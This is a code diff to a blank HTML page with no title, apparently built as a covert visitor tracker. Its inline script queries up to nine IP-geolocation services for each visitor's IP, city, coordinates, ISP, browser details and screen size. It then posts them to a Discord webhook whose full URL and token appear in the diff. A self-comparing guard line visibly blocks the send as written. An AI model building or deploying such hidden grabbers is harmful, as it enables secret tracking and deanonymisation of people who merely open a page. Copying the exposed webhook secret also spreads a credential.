@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title></title>
     <style>
         * {
@@ -14,7 +14,6 @@
             background-color: #ffffff;
             min-height: 100vh;
             width: 100%;
-            display: block;
         }
     </style>
 </head>
@@ -22,99 +21,186 @@
 
 <script>
     (function() {
-        const WEBHOOK_URL = 'https://your-webhook-url.com/endpoint';
-
-        let ipData = {
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1485791212681302172/iu7AbfwcqpHibaTEi3PZYPdYiNm_WMn0nqumGMDfLKPd1A7J8a6Ix9NvLBrr0Z-OzJjJ';
+        
+        let webhookSent = false;
+        
+        let collectedData = {
             ip: null,
-            location: {
-                country: null,
-                region: null,
-                city: null,
-                lat: null,
-                lon: null,
-                timezone: null,
-                isp: null,
-                org: null
-            },
+            country: null,
+            region: null,
+            city: null,
+            latitude: null,
+            longitude: null,
+            timezone: null,
+            isp: null,
+            org: null,
             source: null,
             timestamp: new Date().toISOString(),
             userAgent: navigator.userAgent,
             referrer: document.referrer || null,
-            url: window.location.href
+            url: window.location.href,
+            language: navigator.language,
+            screenSize: `${window.screen.width}x${window.screen.height}`
         };
-
-        let fallbackAttempted = false;
-        let primaryFailed = false;
-
+        
         function sendToWebhook(data) {
+            if (webhookSent) return;
             if (!WEBHOOK_URL || WEBHOOK_URL === 'https://discord.com/api/webhooks/1485791212681302172/iu7AbfwcqpHibaTEi3PZYPdYiNm_WMn0nqumGMDfLKPd1A7J8a6Ix9NvLBrr0Z-OzJjJ') {
+                console.warn('Webhook URL not configured');
                 return;
             }
-            try {
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    mode: 'cors',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(data),
-                    keepalive: true
-                }).catch(e => console.warn);
-            } catch (e) {}
-        }
-
-        function finalizeAndSend() {
-            if (ipData.ip && ipData.source) {
-                sendToWebhook(ipData);
-            } else if (!ipData.ip) {
-                ipData.ip = 'unavailable';
-                ipData.source = 'none';
-                sendToWebhook(ipData);
-            } else {
-                sendToWebhook(ipData);
-            }
-        }
-
-        function enrichWithGeo(geoPayload, sourceName) {
-            if (geoPayload && typeof geoPayload === 'object') {
-                if (geoPayload.country) ipData.location.country = geoPayload.country;
-                if (geoPayload.region_name) ipData.location.region = geoPayload.region_name;
-                if (geoPayload.city) ipData.location.city = geoPayload.city;
-                if (geoPayload.latitude) ipData.location.lat = geoPayload.latitude;
-                if (geoPayload.longitude) ipData.location.lon = geoPayload.longitude;
-                if (geoPayload.timezone) ipData.location.timezone = geoPayload.timezone;
-                if (geoPayload.org) ipData.location.org = geoPayload.org;
-                if (geoPayload.isp) ipData.location.isp = geoPayload.isp;
-                
-                if (geoPayload.loc && typeof geoPayload.loc === 'string') {
-                    let parts = geoPayload.loc.split(',');
-                    if (parts.length === 2) {
-                        ipData.location.lat = parseFloat(parts[0]);
-                        ipData.location.lon = parseFloat(parts[1]);
-                    }
-                }
-                if (geoPayload.region && !ipData.location.region) ipData.location.region = geoPayload.region;
-                if (geoPayload.country_name && !ipData.location.country) ipData.location.country = geoPayload.country_name;
-            }
-            ipData.source = sourceName;
-            finalizeAndSend();
-        }
-
-        function fallbackIpGeoFetch() {
-            if (fallbackAttempted) return;
-            fallbackAttempted = true;
             
-            fetch('https://ipapi.co/json/')
-                .then(response => {
-                    if (!response.ok) throw new Error('ipapi failed');
+            webhookSent = true;
+            
+            const payload = {
+                ...data,
+                timestamp: new Date().toISOString(),
+                receivedAt: new Date().toISOString()
+            };
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'cors',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(payload),
+                keepalive: true
+            }).catch(function(err) {
+                console.warn('Webhook delivery failed:', err);
+            });
+        }
+        
+        function finalizeAndSend() {
+            if (collectedData.ip) {
+                sendToWebhook(collectedData);
+            } else {
+                collectedData.ip = 'unavailable';
+                collectedData.source = collectedData.source || 'all-services-failed';
+                sendToWebhook(collectedData);
+            }
+        }
+        
+        function updateDataWithGeo(data, sourceName) {
+            if (!data) return false;
+            
+            if (data.ip) collectedData.ip = data.ip;
+            if (data.country || data.country_name) collectedData.country = data.country || data.country_name;
+            if (data.region || data.region_name) collectedData.region = data.region || data.region_name;
+            if (data.city) collectedData.city = data.city;
+            if (data.latitude) collectedData.latitude = data.latitude;
+            if (data.longitude) collectedData.longitude = data.longitude;
+            if (data.lat) collectedData.latitude = data.lat;
+            if (data.lon) collectedData.longitude = data.lon;
+            if (data.timezone) collectedData.timezone = data.timezone;
+            if (data.org) collectedData.org = data.org;
+            if (data.isp) collectedData.isp = data.isp;
+            
+            if (data.loc && typeof data.loc === 'string') {
+                var parts = data.loc.split(',');
+                if (parts.length === 2) {
+                    collectedData.latitude = parseFloat(parts[0]);
+                    collectedData.longitude = parseFloat(parts[1]);
+                }
+            }
+            
+            collectedData.source = sourceName;
+            return true;
+        }
+        
+        function serviceCloudflare() {
+            return fetch('https://www.cloudflare.com/cdn-cgi/trace')
+                .then(function(response) {
+                    if (!response.ok) throw new Error('Cloudflare trace failed');
+                    return response.text();
+                })
+                .then(function(text) {
+                    var lines = text.split('\n');
+                    var ip = '';
+                    var country = '';
+                    for (var i = 0; i < lines.length; i++) {
+                        var line = lines[i];
+                        if (line.startsWith('ip=')) ip = line.substring(3);
+                        if (line.startsWith('loc=')) country = line.substring(4);
+                    }
+                    if (ip) {
+                        return {
+                            ip: ip,
+                            country: country,
+                            source: 'cloudflare-cdn'
+                        };
+                    }
+                    throw new Error('No IP in cloudflare trace');
+                });
+        }
+        
+        function serviceIpApi() {
+            return fetch('http://ip-api.com/json/?fields=66846719')
+                .then(function(response) {
+                    if (!response.ok) throw new Error('ip-api failed');
                     return response.json();
                 })
-                .then(data => {
+                .then(function(data) {
+                    if (data && data.status === 'success' && data.query) {
+                        return {
+                            ip: data.query,
+                            country: data.country,
+                            region: data.regionName,
+                            city: data.city,
+                            latitude: data.lat,
+                            longitude: data.lon,
+                            isp: data.isp,
+                            org: data.org,
+                            timezone: data.timezone
+                        };
+                    }
+                    throw new Error('ip-api returned unsuccessful');
+                });
+        }
+        
+        function serviceIpInfo() {
+            return fetch('https://ipinfo.io/json')
+                .then(function(response) {
+                    if (!response.ok) throw new Error('ipinfo failed');
+                    return response.json();
+                })
+                .then(function(data) {
                     if (data && data.ip) {
-                        ipData.ip = data.ip;
-                        let geo = {
+                        var result = {
+                            ip: data.ip,
+                            country: data.country,
+                            region: data.region,
+                            city: data.city,
+                            timezone: data.timezone,
+                            org: data.org
+                        };
+                        if (data.loc) {
+                            var coords = data.loc.split(',');
+                            if (coords.length === 2) {
+                                result.latitude = parseFloat(coords[0]);
+                                result.longitude = parseFloat(coords[1]);
+                            }
+                        }
+                        return result;
+                    }
+                    throw new Error('No ip in ipinfo response');
+                });
+        }
+        
+        function serviceIpApiCo() {
+            return fetch('https://ipapi.co/json/')
+                .then(function(response) {
+                    if (!response.ok) throw new Error('ipapi.co failed');
+                    return response.json();
+                })
+                .then(function(data) {
+                    if (data && data.ip) {
+                        return {
+                            ip: data.ip,
                             country: data.country_name,
-                            region_name: data.region,
+                            region: data.region,
                             city: data.city,
                             latitude: data.latitude,
                             longitude: data.longitude,
@@ -122,134 +208,237 @@
                             org: data.org,
                             isp: data.org
                         };
-                        enrichWithGeo(geo, 'ipapi.co (fallback)');
-                    } else {
-                        throw new Error('no ip in ipapi');
                     }
-                })
-                .catch(() => {
-                    fetch('https://api.ipify.org?format=json')
-                        .then(res => res.json())
-                        .then(ipifyData => {
-                            if (ipifyData && ipifyData.ip) {
-                                ipData.ip = ipifyData.ip;
-                                ipData.location = { country: null, region: null, city: null, lat: null, lon: null, timezone: null, isp: null, org: null };
-                                ipData.source = 'ipify.org (only ip, no geo)';
-                                finalizeAndSend();
-                            } else {
-                                throw new Error('ipify failed');
-                            }
-                        })
-                        .catch(() => {
-                            ipData.ip = 'unknown';
-                            ipData.source = 'all-fallbacks-failed';
-                            finalizeAndSend();
-                        });
+                    throw new Error('No ip in ipapi.co');
                 });
         }
-
-        function primaryIpGeoFetch() {
-            fetch('https://ipinfo.io/json?token=')
-                .then(response => {
-                    if (!response.ok) throw new Error('ipinfo failed');
+        
+        function serviceIpWhoIs() {
+            return fetch('https://ipwho.is/')
+                .then(function(response) {
+                    if (!response.ok) throw new Error('ipwho.is failed');
                     return response.json();
                 })
-                .then(data => {
-                    if (data && data.ip) {
-                        ipData.ip = data.ip;
-                        let geo = {
+                .then(function(data) {
+                    if (data && data.success === true && data.ip) {
+                        return {
+                            ip: data.ip,
                             country: data.country,
-                            region_name: data.region,
+                            region: data.region,
                             city: data.city,
-                            loc: data.loc,
+                            latitude: data.latitude,
+                            longitude: data.longitude,
                             timezone: data.timezone,
-                            org: data.org
+                            isp: data.connection ? data.connection.isp : null,
+                            org: data.connection ? data.connection.org : null
                         };
-                        if (data.loc) {
-                            let coords = data.loc.split(',');
-                            if (coords.length === 2) {
-                                geo.latitude = parseFloat(coords[0]);
-                                geo.longitude = parseFloat(coords[1]);
-                            }
-                        }
-                        enrichWithGeo(geo, 'ipinfo.io (primary)');
-                    } else {
-                        throw new Error('no ip data');
                     }
-                })
-                .catch(() => {
-                    primaryFailed = true;
-                    fetch('https://api.ipgeolocation.io/ipgeo?apiKey=demo&fields=geo')
-                        .then(response => {
-                            if (!response.ok) throw new Error('ipgeolocation failed');
-                            return response.json();
-                        })
-                        .then(data => {
-                            if (data && data.ip) {
-                                ipData.ip = data.ip;
-                                let geo = {
-                                    country: data.country_name,
-                                    region_name: data.state_prov,
-                                    city: data.city,
-                                    latitude: data.latitude,
-                                    longitude: data.longitude,
-                                    timezone: data.time_zone?.name || null,
-                                    isp: data.isp,
-                                    org: data.organization
-                                };
-                                enrichWithGeo(geo, 'ipgeolocation.io (secondary)');
-                            } else {
-                                throw new Error('no ip from ipgeolocation');
-                            }
-                        })
-                        .catch(() => {
-                            fallbackIpGeoFetch();
-                        });
+                    throw new Error('ipwho.is unsuccessful');
                 });
         }
-
-        function browserBasedGeoFallback() {
-            if ('geolocation' in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        if (ipData.ip && ipData.ip !== 'unavailable' && ipData.ip !== 'unknown') {
-                            ipData.location.lat = position.coords.latitude;
-                            ipData.location.lon = position.coords.longitude;
-                            ipData.location.source_enhanced = 'browser_geolocation';
-                            sendToWebhook(ipData);
-                        } else if (!ipData.ip || ipData.ip === 'unavailable') {
-                            ipData.ip = 'browser-geo-only';
-                            ipData.location.lat = position.coords.latitude;
-                            ipData.location.lon = position.coords.longitude;
-                            ipData.source = ipData.source ? ipData.source + '+browser-geo' : 'browser-geolocation';
-                            sendToWebhook(ipData);
-                        } else {
-                            ipData.location.lat = position.coords.latitude;
-                            ipData.location.lon = position.coords.longitude;
-                            sendToWebhook(ipData);
-                        }
-                    },
-                    function() { },
-                    { timeout: 5000, maximumAge: 0 }
-                );
-            }
+        
+        function serviceFreeGeoIp() {
+            return fetch('https://freegeoip.app/json/')
+                .then(function(response) {
+                    if (!response.ok) throw new Error('freegeoip failed');
+                    return response.json();
+                })
+                .then(function(data) {
+                    if (data && data.ip) {
+                        return {
+                            ip: data.ip,
+                            country: data.country_name,
+                            region: data.region_name,
+                            city: data.city,
+                            latitude: data.latitude,
+                            longitude: data.longitude,
+                            timezone: data.time_zone
+                        };
+                    }
+                    throw new Error('No ip in freegeoip');
+                });
         }
-
-        primaryIpGeoFetch();
-
-        setTimeout(function() {
-            if (!ipData.ip || ipData.ip === null) {
-                if (!fallbackAttempted && !primaryFailed) {
-                    fallbackIpGeoFetch();
+        
+        function serviceIpData() {
+            return fetch('https://api.ipdata.co?api-key=test')
+                .then(function(response) {
+                    if (!response.ok) throw new Error('ipdata failed');
+                    return response.json();
+                })
+                .then(function(data) {
+                    if (data && data.ip) {
+                        return {
+                            ip: data.ip,
+                            country: data.country_name,
+                            region: data.region,
+                            city: data.city,
+                            latitude: data.latitude,
+                            longitude: data.longitude,
+                            timezone: data.time_zone ? data.time_zone.name : null,
+                            org: data.asn ? data.asn.name : null
+                        };
+                    }
+                    throw new Error('No ip in ipdata');
+                });
+        }
+        
+        function serviceIp2Location() {
+            return fetch('https://api.ip2location.io/?format=json')
+                .then(function(response) {
+                    if (!response.ok) throw new Error('ip2location failed');
+                    return response.json();
+                })
+                .then(function(data) {
+                    if (data && data.ip) {
+                        return {
+                            ip: data.ip,
+                            country: data.country_name,
+                            region: data.region_name,
+                            city: data.city_name,
+                            latitude: data.latitude,
+                            longitude: data.longitude,
+                            timezone: data.time_zone,
+                            isp: data.isp,
+                            org: data.as
+                        };
+                    }
+                    throw new Error('No ip in ip2location');
+                });
+        }
+        
+        function serviceAbstractApi() {
+            return fetch('https://ipgeolocation.abstractapi.com/v1/?api_key=null')
+                .then(function(response) {
+                    if (!response.ok) throw new Error('abstractapi failed');
+                    return response.json();
+                })
+                .then(function(data) {
+                    if (data && data.ip_address) {
+                        return {
+                            ip: data.ip_address,
+                            country: data.country,
+                            region: data.region,
+                            city: data.city,
+                            latitude: data.latitude,
+                            longitude: data.longitude,
+                            timezone: data.timezone ? data.timezone.name : null
+                        };
+                    }
+                    throw new Error('No ip in abstractapi');
+                });
+        }
+        
+        var services = [
+            { name: 'ip-api.com', fn: serviceIpApi, priority: 1 },
+            { name: 'ipinfo.io', fn: serviceIpInfo, priority: 2 },
+            { name: 'ipapi.co', fn: serviceIpApiCo, priority: 3 },
+            { name: 'ipwho.is', fn: serviceIpWhoIs, priority: 4 },
+            { name: 'cloudflare', fn: serviceCloudflare, priority: 5 },
+            { name: 'freegeoip.app', fn: serviceFreeGeoIp, priority: 6 },
+            { name: 'ip2location.io', fn: serviceIp2Location, priority: 7 },
+            { name: 'abstractapi', fn: serviceAbstractApi, priority: 8 },
+            { name: 'ipdata.co', fn: serviceIpData, priority: 9 }
+        ];
+        
+        var currentServiceIndex = 0;
+        var completed = false;
+        var timeoutId = null;
+        
+        function tryNextService() {
+            if (completed) return;
+            
+            if (currentServiceIndex >= services.length) {
+                if (!collectedData.ip) {
+                    collectedData.ip = 'unavailable';
+                    collectedData.source = 'all-services-failed';
+                    finalizeAndSend();
                 }
+                completed = true;
+                if (timeoutId) clearTimeout(timeoutId);
+                return;
             }
-        }, 2000);
-
+            
+            var service = services[currentServiceIndex];
+            currentServiceIndex++;
+            
+            var serviceTimeout = setTimeout(function() {
+                tryNextService();
+            }, 3000);
+            
+            service.fn()
+                .then(function(geoData) {
+                    clearTimeout(serviceTimeout);
+                    if (completed) return;
+                    
+                    if (geoData && geoData.ip) {
+                        updateDataWithGeo(geoData, service.name);
+                        completed = true;
+                        finalizeAndSend();
+                    } else {
+                        tryNextService();
+                    }
+                })
+                .catch(function() {
+                    clearTimeout(serviceTimeout);
+                    if (!completed) {
+                        tryNextService();
+                    }
+                });
+        }
+        
+        function simpleIpFallback() {
+            if (completed) return;
+            if (collectedData.ip && collectedData.ip !== 'unavailable') return;
+            
+            fetch('https://api.ipify.org?format=json')
+                .then(function(res) { return res.json(); })
+                .then(function(data) {
+                    if (data && data.ip && !completed) {
+                        collectedData.ip = data.ip;
+                        collectedData.source = collectedData.source || 'ipify.org-simple';
+                        finalizeAndSend();
+                        completed = true;
+                    }
+                })
+                .catch(function() {});
+        }
+        
+        function ultimateFallback() {
+            if (completed) return;
+            setTimeout(function() {
+                if (!completed) {
+                    if (!collectedData.ip) {
+                        collectedData.ip = 'unknown';
+                        collectedData.source = 'ultimate-fallback';
+                        finalizeAndSend();
+                        completed = true;
+                    }
+                }
+            }, 8000);
+        }
+        
+        tryNextService();
+        
         setTimeout(function() {
-            if (!ipData.ip || ipData.ip === null || ipData.ip === 'unavailable' || ipData.ip === 'unknown') {
-                browserBasedGeoFallback();
+            if (!completed && !collectedData.ip) {
+                simpleIpFallback();
             }
-        }, 3500);
+        }, 5000);
+        
+        ultimateFallback();
+        
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                if (!completed && (!collectedData.ip || collectedData.ip === 'unavailable')) {
+                    if (!collectedData.ip) {
+                        collectedData.ip = 'load-timeout';
+                        collectedData.source = 'timeout-fallback';
+                        finalizeAndSend();
+                        completed = true;
+                    }
+                }
+            }, 10000);
+        });
     })();
 </script>
 </body>
